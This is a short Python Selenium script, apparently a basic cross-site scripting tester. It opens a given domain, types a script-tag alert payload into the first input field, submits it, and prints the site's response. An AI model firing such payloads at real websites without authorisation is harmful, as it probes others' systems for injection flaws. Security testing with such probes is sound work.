from impor import *
def init(domain):
    os.system('clear')
    # Caminho para o ChromeDriver
    service = Service("/home/axl/xss-python/chromedriver")
    driver = webdriver.Chrome(service=service)

    # Passo 1: Abrir o site
    driver.get(f"{domain}")

    # Passo 2: Encontrar automaticamente o campo de input
    # Vamos procurar por campos de input na página
    input_elements = driver.find_elements(By.TAG_NAME, "input")  # Encontra todos os campos de input

    # Verificar se encontramos algum campo de input
    if input_elements:
        # Vamos preencher o primeiro campo de input encontrado
        campo_input = input_elements[0]
        campo_input.clear()  # Limpar o campo antes de preencher
        campo_input.send_keys("<script>window.alert('Vulneravel')</script>")

        # Passo 3: Enviar o formulário ou executar a ação (pressionar Enter)
        campo_input.send_keys(Keys.RETURN)  # Ou use .click() se for necessário clicar em um botão
        time.sleep(4)
        # Passo 4: Capturar a resposta do site
        try:
            resposta = driver.find_element(By.CLASS_NAME, "mensagem-resposta")  # Substitua pelo seletor correto
            print("Mensagem do site:", resposta.text)
        except Exception as e:
            print("Erro ao capturar resposta:", e)
    else:
        print("Nenhum campo de input encontrado.")

    # Espera um tempo para que o navegador não feche imediatamente
    time.sleep(10)  # Aguarda 10 segundos para visualizar o site aberto

    # Passo 5: Fechar o navegador
    driver.quit()
